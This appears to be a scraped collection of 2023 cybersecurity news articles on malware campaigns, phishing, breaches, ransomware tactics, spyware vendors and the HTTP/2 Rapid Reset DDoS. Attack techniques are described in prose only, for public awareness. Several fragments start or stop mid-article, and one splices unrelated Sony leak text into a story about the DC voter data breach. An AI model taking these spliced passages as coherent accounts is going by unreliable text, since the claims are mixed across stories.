      "text": " Professors at the University of South Australia and Charles Sturt University have developed an algorithm to detect and intercept man-in-the-middle (MitM) attacks on unmanned military robots.MitM attacks are a type of cyberattack where the data traffic between two parties, in this case, the robot and its legitimate controllers, is intercepted either to eavesdrop or to inject false data in the stream.Such malicious attacks aim to interrupt the operation of unmanned vehicles, modify the transmitted instructions, and, in some cases, even assume control, instructing the robots to take dangerous actions.\"The advent of Industry 4, marked by the evolution in robotics, automation, and the Internet of Things, has demanded that robots work collaboratively, where sensors, actuators, and controllers need to communicate and exchange information with one another via cloud services.\"\"The downside of this is that it makes them highly vulnerable to cyberattacks.\"The university researchers developed an algorithm using machine learning techniques to detect these attempts and shut them down in seconds.The algorithm was tested in a replica of the GVR-BOT used by the U.S. Army (TARDEC), and recorded successful attack prevention 99% of the time, with false positives occurring in less than 2% of the tested cases.Detecting MitM targeting crewless vehicles and robots is complex as these systems operate under fault-tolerant modes, so distinguishing between normal operations and fault conditions can be hazy.Also, robotic systems can be compromised at various levels, from the core system to its sub-systems and their sub-components, causing an operational problem that could render the robot dysfunctional..The university researchers developed a system that analyzed the robot's network traffic data to detect attempts to compromise it. This system uses node-based methods, scrutinizes packet data, and uses a flow-statistic-based system that reads metadata from the packet header.The detailed technical paper released by the researchers delves into the specifics of the deep learning CNN (convolutional neural network) model that was developed for this purpose, comprising multiple layers and filters that raise the reliability of the cyberattack detection outcome.Real tests conducted on the replica bot with simulated cyber-attacks targeting various systems produced excellent results and high identification accuracy even after only 2-3 epochs of model training.Optimized versions of this novel protection system could find applications in similar but more demanding robotic applications, like unmanned aircraft."

      "title": "Microsoft plans to kill off NTLM authentication in Windows 11",
      "text": " Microsoft announced earlier this week that the NTLM authentication protocol will be killed off in Windows 11 in the future.NTLM (short for New Technology LAN Manager) is a family of protocols used to authenticate remote users and provide session security.While it was the default protocol used in old Windows versions, NTLM is still used today, and if, for any reason, Kerberos fails, NTLM will be used instead.NTLM has also been targeted in pass-the-hash attacks, where cybercriminals exploit system vulnerabilities or deploy malicious software to acquire NTLM hashes, which represent hashed passwords, from a targeted system.Once in possession of the hash, attackers can utilize it to authenticate as the compromised user, thus gaining access to sensitive data and spread laterally on the network.However, Microsoft is now working on two new Kerberos features: IAKerb (Initial and Pass Through Authentication Using Kerberos) and Local KDC (Local Key Distribution Center).\"This leverages IAKerb to allow Windows to pass Kerberos messages between remote local machines without having to add support for other enterprise services like DNS, netlogon, or DCLocator. IAKerb also does not require us to open new ports on the remote machine to accept Kerberos messages.\"Microsoft intends to introduce the two new Kerberos features in Windows 11 to broaden its use and tackle two significant challenges leading to Kerberos fallback to NTLM.The first feature, IAKerb, enables clients to authenticate with Kerberos across a broader range of network topologies. The second feature involves a local Key Distribution Center (KDC) for Kerberos, which extends Kerberos support to local accounts.Redmond also plans to expand NTLM management controls, providing administrators with increased flexibility in monitoring and restricting NTLM usage within their environments.\"All these changes will be enabled by default and will not require configuration for most scenarios. NTLM will continue to be available as a fallback to maintain existing compatibility,\" Palko said.\"Reducing the use of NTLM will ultimately culminate in it being disabled in Windows 11. We are taking a data-driven approach and monitoring reductions in NTLM usage to determine when it will be safe to disable.\"In the meantime, you can use the enhanced controls we are providing to get a head start. Once disabled by default, customers will also be able to use these controls to reenable NTLM for compatibility reasons.\""

      "text": " Valve has announced implementing additional security measures for developers publishing games on Steam, including SMS-based confirmation codes. This is to deal with a recent outbreak of malicious updates pushing malware from compromised publisher accounts.Steamworks is a set of tools and services developers and publishers of games/software use to distribute their products on the Steam platform.It supports DRM (digital rights management), multiplayer, video streaming, matchmaking, achievements system, in-game voice and chat, microtransactions, statistics, cloud saving, and community-made content sharing (Steam Workshop).Starting in late August and into September 2023, there has been an elevated number of reports about compromised Steamworks accounts and the attackers uploading malicious builds that infect players with malware.Valve assured the gaming community that the impact of these attacks was limited to a few hundred users, who were individually informed of the potential breach via notices sent by the company.To curb this problem, Valve will enforce a new SMS-based security check starting on October 24, 2023, which game developers must pass before pushing an update on the default release branch (not beta releases).The same requirement will be enforced when someone attempts to add new users to the Steamworks partner group, which is already protected by an email-based confirmation. Starting October 24, the group admin must verify the action with an SMS code.\"The same will be true for any Steamworks account that needs to add new users. This change will go live on October 24, 2023, so be sure to add a phone number to your account now.\"\"We also plan on adding this requirement for other Steamworks actions in the future.\"For those using the SetAppBuildLive API, Steam has updated it to require a steamID for confirmation, particularly for changes to the default branch of a released app.Using 'steamcmd' to set builds live is no longer applicable for managing the default branch of released apps.Also, Valve says there will be no workaround for developers without a phone number, so they must find a way to receive text messages to continue publishing on the platform.While introducing SMS-based verification is a good step towards achieving better supply chain security on Steam, the system is far from perfect.One of the game developers, Benoît Freslon, explained that he was infected with an information-stealing malware that was used to steal his credentials.Using these stolen credentials, the threat actor briefly pushed out a malicious update for the NanoWar: Cells VS Virus that infected players with malware.Freslon explained on Twitter that Valve's new SMS-based MFA security measure wouldn't have helped stop the attack as the info-stealer malware snatched session tokens to all his accounts.The game installer dropped a password-stealing malware on his computer, which targeted his Discord, Steam, Twitch, Twitter, and other accounts.Until the tokens were revoked or expired, the attackers continued to access the developer's accounts, remaining free to push malware-laced game updates to players.Also, SMS 2FA is inherently vulnerable to SIM-swap attacks where threat actors can port the number of a game developer to a new SIM and bypass the security measure.A better and more modern solution would be to enforce authenticator apps or physical security keys, especially for projects with large communities."

      "text": " A new, lightweight variant of the RomCom backdoor was deployed against participants of the Women Political Leaders (WPL) Summit in Brussels, a summit focusing on gender equality and women in politics.The campaign used a fake website mimicking the official WPL portal to bait people seeking to attend or simply interested in the summit.In August 2023, Void Rabisu set up a malicious website on the address 'wplsummit[.]com', designed to imitate the real Women Political Leaders (WPL) website hosted on wplsummit.org.The fake site linked to a OneDrive folder through a button named 'Videos & photos,' which contained pictures from the two days of the event, taken from the genuine site, and a malware downloader named 'Unpublished Pictures.'The malicious executable is signed by an Elbor LLC certificate and is a self-extracting archive containing 56 photos to act as decoys, while a second encrypted file is downloaded from a remote host.The second payload is a DLL that is decrypted and loaded into memory to evade detection and continues to fetch additional components required for establishing communication with the attacker's server.Trend Micro identifies the latest, stripped-down variant of RomCom as the fourth major release of the backdoor, explaining that it's the same malware Volexity researchers recently named 'Peapod.'Compared to RomCom 3.0, the previous version seen in Void Rabisu operations, the new backdoor variant has undergone significant changes, making it lighter and stealthier.It now supports only the following ten commands, a stark reduction from the previous 42.Also, instead of utilizing modified MSIs to drop its components onto devices directly, the new variant leverages an EXE file to fetch XOR-encrypted DLLs, loading all its components in memory.RomCom 4.0 has also incorporated new features related to Transport Layer Security (TLS), a protocol designed to provide secure communication with the C2 server.The malware has been coded to force WinHTTP functions to specifically use the TLS version 1.2 rather than allowing the operating system to choose the default TLS version.This enforcement system results in an error on Windows 7, which Trend Micro considers safe against the newest RomCom variant.The goal of this mechanism is likely to make C2 communication more resistant to snooping, complicate automated discovery, and possibly allow attackers to filter out unsuitable victims.In general, Void Rabisu's tactics and the deployment of the RomCom malware remain cloudy. However, it is clear that the backdoor's development is still ongoing, and its operators are increasingly focused on top-level cyber espionage.Trend Micro concludes that it is very likely that Void Rabisu will target all big conferences related to special interest groups, so caution is advised when visiting event sites."

      "text": " Reporter, Infosecurity MagazineEmail security provider Cofense has discovered a new phishing campaign comprising over 800 emails and using LinkedIn Smart Links.The campaign was active between July and August 2023 and involved various subject themes, such as financial, document, security, and general notification lures, reaching users’ inboxes across multiple industries.The financial, manufacturing and energy sectors are the top targeted verticals.Cofense estimated that “this campaign was not a direct attack on any one business or sector but a blanket attack to collect as many credentials as possible using LinkedIn business accounts and Smart Links to carry out the attack.”LinkedIn Smart Links, also known as slinks, are used by LinkedIn business accounts to deliver content and track user content engagements through the LinkedIn Sales Navigator.A typical Smart Link uses the LinkedIn domain followed by a ‘code’ parameter with an eight-alphanumeric character ID that may contain underscores and dashes. However, malicious Smart Links can include other parts of information, such as obfuscated victim emails.Smart Links have proven to bypass security email gateways (SEGs) and other email security suites due to the link using a trusted domain.This new trove of Smart Links-based phishing messages suggests that these accounts are either newly created or previously compromised LinkedIn business accounts, allowing threat actors insight into the phishing campaign with its tracking capabilities.Upon clicking a malicious LinkedIn Smart Link embedded in an email, the user will be sent directly or through a series of redirects to the phish.The designated phishing kit will read the victim’s email attached to the Smart Link to autofill the malicious form to add to the illusion of legitimacy that the victim has landed at the legitimate Microsoft sign-in. However, a Smart Link will still lead to a credential phishing page without the victim’s email in the URL.Once at the phish, the user will be instructed to log in using their Microsoft Office credentials.LinkedIn Smart Links have been used in malicious phishing campaigns for a while now.Cofense identified large-scale phishing attacks using LinkedIn Smart Links as early as 2021. The company also reported on a large-scale campaign using slinks in September 2022.However, this is not a phishing method that malicious actors regularly use."

However, other threat actors continued to share the original 23andMe leak throughout cybercrime communities and forums.In response to an inquiry, 23andMe told BleepingComputer that the hackers accessed its platform through credential-stuffing attacks on weakly secured accounts. However, they refuted claims of a direct security breach of their systems.A 23andMe spokesperson explained that the attackers initially gained unauthorized access to a small number of accounts but eventually exfiltrated the data of a larger yet undefined number of clients due to them activating an optional feature named 'DNA Relatives,' which connects genetic relatives.Although platform members voluntarily activated the opt-in feature, not all of them accept that the involved risk of internal data-sharing should exempt the firm from its responsibility to place protection layers.In this case, many people following proper security practices by enabling 2FA on their accounts and using a strong and unique password still found themselves exposed, and their sensitive data leaked on cybercrime forums.The lawsuits highlight a lack of information in the company's official announcement regarding the security event, the current status of customer data safety, the network breach's duration, and the cyberattack's exact mechanism.Also, they criticize 23andMe for failing to implement adequate security measures that would help monitor its network for abnormal activity and potentially take action to stop the intrusion much sooner.The legal actions emphasize that 23andMe, a company managing sensitive medical data, should have been well aware of the elevated cybersecurity threats given the numerous high-profile breaches in the industry, underscoring the high value of such data.The plaintiffs ask for various financial reliefs against 23andMe, including restitution, lifetime credit monitoring, actual, compensatory, and statutory damages and penalties, punitive damages, and coverage of attorney's fees."

The attack involves the use of malicious archive files that exploit the recently discovered vulnerability affecting the WinRAR compression software versions prior to 6.23 and traced as CVE-2023-38831.The lure file consists in a PDF document, contained in the archive, that shows a list of Indicator of Compromise (IoCs) with domain names and hashes related to different malware, including SmokeLoader, Nanocore RAT, Crimson RAT and AgentTesla. Due to the vulnerability, the click on the PDF file causes a BAT script to be executed, which launches PowerShell commands to open a reverse shell that gives the attacker the access to the targeted machine and a PowerShell script that steals data, including login credentials, from the Google Chrome and Microsoft Edge browsers. To exfiltrate the data, attackers uses the legit web service webhook[.]site. The lure sample is an archive file named IOC_09_11.rar, probably with the intention of masquerading itself as a file to be used to share Indicators of Compromise (IoCs).

      "text": " A threat actor is using compromised Skype and Microsoft Teams accounts to distribute DarkGate, a troublesome loader associated with multiple malicious activities, including information theft, keylogging, cryptocurrency miners, and ransomware such as Black Basta.Forty-one percent of the targets of the campaign — which appears to have begun in August — are organizations in the Americas, according to researchers at Trend Micro who are tracking the activity.The operator of the DarkGate campaign that Trend Micro is currently tracking is using both Skype and Teams to distribute the malware. In one of the attacks, the threat actor took control of a Skype account belonging to an individual at an organization with whom the target recipient's organization had a trusted relationship. The adversary basically used the compromised Skype account to hijack an existing message thread and send a message that appeared to contain a PDF file but was actually a malicious VBS script. When the recipient executed the file, it initiated a sequence of steps to download and install DarkGate on the target computer.In another attack that Trend Micro analyzed, the threat actor attempted to achieve the same outcome using a Teams account to send a message with a malicious .LNK file, to a target recipient. Unlike the Skype caper, where the threat actor purported to be someone belonging to a trusted third party, in the Teams variation, the recipient received the malicious message from an unknown, external entity. \"In this case, the organization’s system allowed the victim to receive messages from external users, which resulted in them becoming a potential target of spam,\" Trend Micro said.\"We also observed a tertiary delivery method of using a VBA script wherein a .LNK file arrives in a compressed file from the originators' SharePoint site,\" the security vendor said. In this attack variation, the threat actor attempts to lure the victim to a specific SharePoint site, to download a file named \"Significant company changes September.zip.\"DarkGate is malware that has targeted users in various regions around the world since at least 2017. It integrates multiple relatively potent functions; for instance, the malware can execute commands for gathering system information, mapping networks, and doing directory traversal. It also implements remote desktop protocol (RDP), hidden virtual network computing, AnyDesk, and other remote access software. Other \"features\" include ones related to cryptocurrency mining, keylogging, privilege escalation, and stealing information from browsers.For payload delivery and execution, DarkGate uses AutoIT, a legitimate Windows automation and scripting tool that authors of other malware families have used for obfuscation and defense evasion.Trend Micro said it was able to contain the DarkGate attacks it observed before any actual harm came to pass. But given the developer's apparent pivot to a new malware leasing model, enterprise security teams can expect more attacks from varied threat actors. The objectives of these adversaries could vary, meaning organizations need to keep an eye out for threat actors using DarkGate to infect systems with different kinds of malware.While the attacks that Trend Micro observed targeted individual Skype and Teams recipients, the attacker's goal clearly was to use their systems as an initial foothold on the target organization's networks. \"The goal is still to penetrate the whole environment, and depending on the threat group that bought or leased the DarkGate variant used, the threats can vary from ransomware to cryptomining,\" according to Trend Micro.The security firm recommends that organizations enforce rules around the use of instant messaging applications such as Skype and Teams. These rules should include blocking external domains, controlling the use of attachments and implementing scanning measures if possible. Multifactor authentication is also crucial to prevent threat actors from misusing illegally obtained credentials to hijack IM accounts, Trend Micro said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Legitimate native Windows tools like PsExec and Nltest were also seen.Another component of AvosLocker attacks is a piece of malware called NetMonitor.exe, which poses as a legitimate process and “has the appearance of a legitimate network monitoring tool.”However, NetMonitor is a persistence tool that hails from the network every five minutes and acts as a reverse proxy that enables the threat actors to remotely connect to the compromise network.Using details from the investigation of “an advanced digital forensics group,” the FBI created the YARA rule below to detect NetMonitor malware on a network.CISA and the FBI recommend organizations to implement application control mechanisms to control the execution of software, including allowed programs, as well as prevent running portable versions of unauthorized utilities, especially remote access tools.Part of the best practices for defending against threat actors are restrictions for using remote desktop services, such as RDP, by limiting the number of login attempts and implementing phishing-resistant multi-factor authentication (MFA).Applying the principle of least privileges is also part of the recommendations, and organizations should disable command-line, scripting, and the use of PowerShell for users that don’t require them for their job.Keeping software and code updated to the latest version, using longer passwords, storing them in a hashed format, and salting them if the logins are shared, and segmenting the network, remain the constant recommendations from security experts."

      "text": " A newly discovered campaign dubbed \"Stayin' Alive\" has been targeting government organizations and telecommunication service providers across Asia since 2021, using a wide variety of \"disposable\" malware to evade detection.Most of the campaign's targets seen by cybersecurity firm Check Point are based in Kazakhstan, Uzbekistan, Pakistan, and Vietnam, while the campaign is still underway.The attacks appear to originate from the Chinese espionage actor known as 'ToddyCat,' which relies on spear-phishing messages carrying malicious attachments to load a variety of malware loaders and backdoors.The researchers explain that the threat actors use many different types of custom tool, which they believe are disposable to help evade detection and prevent linking attacks to each other..\"The wide set of tools described in this report are custom-made and likely easily disposable. As a result, they show no clear code overlaps with any known toolset, not even with each other,\" explains Check Point.The attack begins with a spear-phishing email crafted to target specific individuals in key organizations, urging them to open the attached ZIP file.The archive contains a digitally signed executable named to match the email context and a malicious DLL that exploits a vulnerability (CVE-2022-23748) in Audinate's Dante Discovery software to side-load  the \"CurKeep\" malware on the system.CurKeep is a 10kb backdoor that establishes persistence on the breached device, sends system info to the command-and-control (C2) server, and then waits for commands.The backdoor can exfiltrate a directory list for the victim's Program Files, indicating what software is installed on the computer, execute commands and send the output to the C2 server, and handle file-based tasks as instructed by its operators.Beyond CurKeep, the campaign utilizes other tools, mainly loaders, executed primarily through similar DLL side-loading methods.Notable ones include the CurLu loader, CurCore, and CurLog loader, each with unique functionalities and infection mechanisms.CurCore is the most interesting of the secondary payloads, as it can create files and populate their contents with arbitrary data, execute remote commands, or read a file and return its data in base64 encoded form.Another notable backdoor that stands out from the rest is 'StylerServ,' which acts as a passive listener that monitors traffic on five ports (60810 through 60814) for a specific XOR-encrypted configuration file ('stylers.bin').The report does not specify the exact functionality or purpose of StylerServ or stylers.bin, but it is likely part of a stealthy configuration serving mechanism for other malware components.The security company says the newly identified cluster is likely a segment of a broader campaign involving more undiscovered tools and attack methods.Judging from the wide variety of distinct tools seen in the attacks and their level of customization, these appear to be disposable.Over the past year, Kaspersky observed a parallel cluster of activity from the same threat actor, different from the one seen by Check Point, with two attack variants employing legitimate VLC executables to load malware using the DLL sideloading technique.A notable malware deployed in these attacks is 'Ninja Agent,' which features file management, reverse shell, process management, and more.Other tools ToddyCat deployed in these attacks include LoFiSe (file tracker and stealer), Cobalt Strike (penetration testing suite), DropBox Uploader, and a passive UDP backdoor."

It was traced back to vulnerabilities in MOVEit Transfer, a file transfer software used by Fiserv for payment processing and mobile banking services. The unauthorized activity occurred between May 27 and 31 2023, before the vulnerability was publicly disclosed, allowing threat actors to access and obtain customer information, including names and other data elements.“This attack demonstrates that an organization’s security is only as strong as its third or fourth party’s weakest security program.”To support affected customers, Flagstar Bank has been providing complimentary identity monitoring services through Kroll for two years. This includes credit monitoring, fraud consultation and identity theft restoration. The company also recommended that all affected individuals remain vigilant, monitor their credit history, review account statements and report any suspicious activity to financial institutions.“Customers of this bank [...] will want to keep a close eye on all of their accounts, take advantage of the inevitable free credit monitoring, and they should stay alert for possible phishing attempts.”The incident marks the third significant cybersecurity breach for Flagstar Bank since 2021. The first breach happened in March 2021 when the Clop ransomware group reportedly pilfered customers’ personal data.Editorial image credit: Michael Vi / Shutterstock.com"

It also installed “Havoc” – an open-source, post-exploitation command-and-control (C2) framework used in a similar way to Cobalt Strike.Grayling used publicly available spyware tool NetSpy, exploited legacy Windows elevation of privileges bug CVE-2019-0803, and downloaded and executed shellcode, the report noted.“Other post-exploitation activity performed by these attackers includes using kill processes to kill all processes listed in a file called processlist.txt, and downloading the publicly available credential-dumping tool Mimikatz,” explained Symantec.“While we do not see data being exfiltrated from victim machines, the activity we do see and the tools deployed point to the motivation behind this activity being intelligence gathering.”The security vendor said that Grayling’s modus operandi was fairly typical of APT groups today, in blending custom and publicly available tools; the latter to help it stay under the radar. Havoc and Cobalt Strike are particularly useful, and popular, in featuring a wide range of post-exploitation capabilities.“The use of publicly available tools can also make attribution of activity more difficult for investigators. The steps taken by the attackers, such as killing processes etc., also indicate that keeping this activity hidden was a priority for them.”Although the vendor stopped short of naming a potential nation state, it’s clear that the targets sought out by Grayling align with Beijing’s geopolitical interests."

      "text": " A new DDoS (distributed denial of service) technique named 'HTTP/2 Rapid Reset' has been actively exploited as a zero-day since August, breaking all previous records in magnitude.News of the zero-day technique comes as a coordinated announcement today between Amazon Web Services, Cloudflare, and Google, who report mitigating attacks reaching 155 million requests per second (Amazon), 201 million rps (Cloudflare), and a record-breaking 398 million rps (Google).Cloudflare comments that the size of the attack it mitigated is three times bigger than its previous record, from February 2023 (71 million rps), and it's alarming that this was achieved using a relatively small botnet comprising 20,000 machines.Since late August, Cloudflare has detected and mitigated over a thousand 'HTTP/2 Rapid Reset' DDoS attacks that surpassed 10 million rps, with 184 breaking the previous 71 million rps record.Cloudflare is confident that as further threat actors employ more expansive botnets along with this new attack method, HTTP/2 Rapid Reset attacks will continue to break even greater records.\"Given that the entire web typically sees only between 1–3 billion requests per second, it's not inconceivable that using this method could focus an entire web's worth of requests on a small number of targets.\"The novel attack exploits a zero-day vulnerability tracked as CVE-2023-44487, which abuses a weakness in the HTTP/2 protocol.Simply put, the attack method abuses HTTP/2's stream cancellation feature to continuously send and cancel requests, overwhelming the target server/application and imposing a DoS state.HTTP/2 features a safeguard in the form of a parameter that limits the number of concurrently active streams to prevent DoS attacks; however, this isn't always effective.The protocol developers introduced a more efficient measure called \"request cancelation,\" which doesn't tear down the whole connection but which can be abused.Malicious actors have been abusing this feature since late August to send a flurry of HTTP/2 requests and resets (RST_Stream frames) on a server, asking it to process each of them and perform rapid resets, overwhelming its capacity to respond to new incoming requests.\"The client may also assume that the cancellation will take effect immediately when the server receives the RST_STREAM frame, before any other data from that TCP connection is processed.\"Cloudflare explains that HTTP/2 proxies or load-balancers are particularly susceptible to those long strings of reset requests sent quickly.The firm's network was overwhelmed at the point between the TLS proxy and its upstream counterpart, so the damage was done before the bad requests reached the block point.In terms of real-world impact, these attacks have caused an increase in 502 error reports among Cloudflare's clients.Cloudflare says it eventually mitigated these attacks using a system designed to handle hyper-volumetric attacks called 'IP Jail,' which the internet firm expanded to cover its entire infrastructure.This system \"jails\" offending IPs and bars them from using HTTP/2 for any Cloudflare domain for a period of time while impacting legitimate users sharing the jailed IP with a minor performance drop.All three firms conclude that the best approach for clients to counter HTTP/2 Rapid Reset attacks is to use all available HTTP-flood protection tools and bolster their DDoS resilience with multifaceted mitigations.Unfortunately, as this tactic abuses the HTTP/2 protocol, there is no general fix that entirely blocks attackers from using this DDoS technique.Instead, software developers who utilize the protocol in their software are implementing rate controls to mitigate HTTP/2 Rapid Reset attacks.In a separate post, Cloudflare explains that they had to keep the zero-day secret for over a month to allow security vendors and stakeholders time to react to the threat before it's made known to more threat actors and the \"cat and mouse\" game begins.\"However, at some point, the responsible thing becomes to publicly disclose zero-day threats like this.

The technology allows Intellexa customers to quietly redirect target users to a Pegasus infection server when they browse any HTTP Web page. For the technology to work, mobile ISPs need to install Mars on their network, assign a static IP to the target subscriber and set up rules for forwarding traffic from the target IP address to the Mars system. \"The network injection system can respond to the original HTTP request with a HTTP redirect containing a 1-click browser exploit link which infects the device without further user action,\" the report noted.Intellexa offers an add-on product to Mars called Jupiter that its customers can use to do similar network injection into encrypted HTTPS traffic. In this case however, the injection only works with websites hosted in the target user's country. As with the Mars product, customers have to convince mobile ISPs to install Jupiter hardware on their networks. The technology basically enables Intellexa customers to insert themselves in the middle of HTTPS requests sent from the target user to a local HTTPS website and inject Predator.Another tool that Amnesty highlighted in its report is Triton, a product that Intellexa has positioned as something that customers can use to infect Samsung devices — including the latest models running the most recent versions of Android. \"The system appears to target vulnerabilities in baseband software used in Samsung devices which allows infection with the Predator spyware with 'no interaction with the target' or the need for the target to use a browser or any other app.\" The Triton attack chain involves the malware first using a so-called IMSI catcher to downgrade Samsung devices from 5G, 4G, and 3G to the old 2G protocol. Once that happens, Triton uses what appears to be an integrated software defined base station to deliver the payload, the Amnesty report noted.The other Intellexa tools that the Amnesty report highlights include SpearHead, a range of Wi-Fi interception and infection products that operators can carry James-Bond-like on a briefcase, in a surveillance van on a drone. The technology from Intellexa alliance partner WiSpear allows for target identification, geolocation monitoring, traffic interception and payload delivery. Other tools include a 3G/4G GSM interception and infection product called Alpha-Max from Nexa group and Jasmine a product for deanonymizing encrypted WhatsApp and Signal traffic using metadata analysis.Intellexa has often bundled these technologies to offer an end-to-end surveillance capability for governments and law-enforcement agencies. An Intellexa price proposal that EIC investigators obtained showed the company offering a full range of remote data extraction services from Android and iOS devices for 8 million Euros. The price includes one-click exploits for delivering Predator on Android and iOS devices, the ability to monitor up to 10 targets concurrently, analysis of all data extracted from target systems, and a 12-month warranty.Microsoft, which released a 128-page digital defense report this week has one section on the emerging threat to organizations posed by cyber mercenary groups, of which Intellexa would be one. The company describes them as private sector offensive actors.\"Cyber mercenaries, as they're called sometimes in the policy world, dot the landscape,\" says Sherrod DeGrippo, director of threat intelligence strategy at Microsoft. \"I think it's something that we're going to have to continue watching because these are the entities that supply nation states with their technical capabilities to carry out destructive actions.\"DeGrippo perceives the sector as a bit of a gray area that is only going to continue to evolve and grow, because of the potential for significant financial gain. \"We have to commit to making sure that we are thinking about this threat, tracking this as a threat, making sure that we protect our customers and individuals from these kinds of threats and being, in some ways, threat landscape agnostic.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

However, upon closer inspection, they found that the loader contained a regular expression match searching for a specific string in the returned HTML of the 404 page.Upon locating the string on the page, Akamai found a concatenated base64-encoded string concealed in a comment. Decoding that string revealed the JavaScript skimmer, which hides in all 404 pages.\"We simulated additional requests to nonexistent paths, and all of them returned the same 404 error page containing the comment with the encoded malicious code,\" explains Akamai\"These checks confirm that the attacker successfully altered the default error page for the entire website and concealed the malicious code within it!\"Because the request is made to a first-party path, most security tools monitoring suspicious network requests on the checkout page would overlook it.The skimmer code displays a fake form that the website visitors are expected to fill out with sensitive details, including their credit card number, expiration date, and security code.Once this data is entered on the bogus form, the victim gets a fake \"session timeout\" error.In the background, all information is base64-encoded and sent to the attacker via an image request URL carrying the string as a query parameter.This approach helps evade detection by network traffic monitoring tools, as the request looks like a benign image fetch event. However, decoding the base64 string reveals personal and credit card information.The case of manipulating 404 pages highlights the evolving tactics and versatility of Magecart actors, who continually make it harder for webmaster to locate their malicious code on compromised websites and sanitize them."

While the incident remains under investigation, DCBOE's internal databases & servers were not compromised,\" the agency said.In close cooperation with MS-ISAC's Computer Incident Response Team (CIRT), DCBOE took down its website and replaced it with a maintenance page to contain the situation after identifying it as the source of the breach.Since the discovery of the incident, the election board worked with data security experts, the Federal Bureau of Investigation (FBI), and the Department of Homeland Security (DHS) to conduct a comprehensive security assessment of its internal systems.Additionally, DCBOE initiated vulnerability scans across its database, server, and IT networks to identify potential security issues that might have facilitated the attackers' access to the stolen information.RansomedVC alleges that the recent incident resulted in the theft of over 600,000 lines of U.S. voter data, encompassing records of D.C. voters. \"We have successfully breached the District of Columbia Board Of Elections and have gotten more than 600k lines of USA Voters,\" the threat actor says.The stolen information is currently being offered for sale on the threat actor's dark web leak site, but the exact price is undisclosed.As verification of the data's authenticity, RansomedVC has provided a single record containing what it claims to be the personal details of a Washington D.C. voter. This dataset includes the individual's name, registration ID, voter ID, partial Social Security number, driver's license number, date of birth, phone number, email, and more.\"It should be noted that in the District of Columbia, some voter registration data-such as voter names, addresses, voting records, and party affiliation-is public information, unless it has been made confidential in accordance with District of Columbia rules and regulations,\" the Washington election authority said in its statement.However, election authorities do not provide access to confidential information such as voters' contact information and SSNs.While RansomedVC has claimed the breach and is now selling the data on their leak site, an anonymous source told BleepingComputer on October 3rd that DCBOE's stolen database was first put up for sale on the BreachForums and Sinister.ly hacking forums by a user named pwncoder (those posts have since been deleted).As BleepingComputer was told, the data was dumped from a stolen MSSQL database and contained the information of more than 600,000 D.C. voters.The latter party released a 2.4 GB archive of files on BreachForums, allegedly taken from Sony's systems.While the data shared by these attackers seems linked to Sony, BleepingComputer could not independently validate the authenticity of either party's claims."

It was originally \"flashed\" – a tactic involving the quick posting and deletion of a company to encourage a fast response from the victim.\"When deadlines come and go it is a sign the company is negotiating or has at least acknowledged the incident,\" he said.\"The repost is usually the final stages. The ransoms process can take weeks/months.\"Posting a company to a victim blog multiple times isn't something that happens in every case but it is a known aggressive tactic adopted by ransomware groups to hurry negotiations, experts told The Register.\"Ransomware groups are ramping up their tactics in forcing victims to pay quickly and this is all part of their business model to extort more money in a timely fashion from their targets,\" said Jake Moore, global cybersecurity advisor at ESET. \"There is always a chance, however, that this is a tactic used to force their victims' hands to act quickly yet no real substance be in the original claim.\"This is the common gamble played between cybercriminals and their victims where one wrong move and a poker face could cost companies huge amounts in ransom payments and more problems thereafter from leaked data in public view.\"The deadline was set for February 13 and no data was published. A day later, instead of making Royal Mail International's stolen data public, LockBit posted the full negotiation history between it and the company in the form of a downloadable chat log.The chat logs revealed the ransom demand was originally set at $80 million, later offering a 50 percent discount after the company branded the demands \"absurd.\"At the time, the release of the chat logs was seen as an example of these scare tactics. After Royal Mail's continued refusal to pay, LockBit eventually staggered the publication of its data, much of which included employee information, in 10 separate dumps.In the Royal Mail negotiations, the transcript shows the negotiator attempting to convince LockBit to hand over two files as proof the criminals' decryptor worked.LockBit realized after a few days that the two files would have allowed Royal Mail to fully recover its systems without paying for the decryptor.Towards the end of the negotiations, where Royal Mail appeared to stall LockBit for as long as it could by saying it was waiting for its board to decide on whether to pay the discounted ransom fee, LockBit grew frustrated with the tactics and published the data after days on non-responsiveness from Royal Mail.Over the years, LockBit has been accused of orchestrating various \"PR stunts\" to cause confusion and raise its notoriety level.These have included \"fake\" ransomware attacks on large organizations, posting their details to LockBit's website along with a countdown timer to indicate the publication date of the stolen files, just as it does with genuine victims.One such example came in June 2022, when it claimed to have breached incident response specialists Mandiant. In typical fashion, the countdown timer spent days reaching zero, and what was published wasn't the data it claimed to have stolen from the company, but instead a response to claims that the group was linked to the sanctioned cybercrime outfit Evil Corp.\"Paying ransoms to these cyber threat groups is still not illegal in most countries; however, a formalized association with Evil Corp would render those payments potentially out of the law, with significant civil and criminal implications for the organizations involved in them. \"Given that LockBit is one of the most prolific ransomware groups in activity at the moment, it is likely that they intend to continue their highly successful and profitable ransomware operations for the following months.\"LockBit repeated the same trick later that year, this time against French multinational IT company Thales. Although in Thales's case, it was only half fibbing.At the time, Thales's public statements repeatedly denied evidence of an IT intrusion, but on November 10, 2022 – three days after LockBit promised to publish its data – Thales confirmed that data had been stolen and published.However, it said the theft was carried out by \"two likely sources,\" one of which was \"confirmed through the user account of a partner on a dedicated collaboration portal,\" and the other was unknown. ®The Register   Biting the hand that feeds IT\n                        Copyright.

      "text": " \n      Award-winning news, views, and insight from the ESET security community\n    \n        Award-winning news, views, and insight from the ESET security community\n      ESET ResearchESET researchers discovered a cyberespionage campaign against a governmental entity in Guyana\n05 Oct 2023\n • \n, \n15 min. read\nIn February 2023, ESET researchers detected a spearphishing campaign targeting a governmental entity in Guyana. While we haven’t been able to link the campaign, which we named Operation Jacana, to any specific APT group, we believe with medium confidence that a China-aligned threat group is behind this incident.In the attack, the operators used a previously undocumented C++ backdoor that can exfiltrate files, manipulate Windows registry keys, execute CMD commands, and more. We named the backdoor DinodasRAT based on the victim identifier it sends to its C&C: the string always begins with Din, which reminded us of the hobbit Dinodas from the Lord of the Rings.Key points of this blogpost:This campaign was targeted, as the threat actors crafted their emails specifically to entice their chosen victim organization. After successfully compromising the first couple of machines with DinodasRAT, the operators proceeded to move laterally and breach the target’s internal network, where they again deployed the DinodasRAT backdoor, along with additional malicious tools, among them a variant of Korplug (aka PlugX). The overview of the compromise flow in Operation Jacana is shown in Figure 1.While our attribution to a China-aligned threat actor is made with only medium confidence, 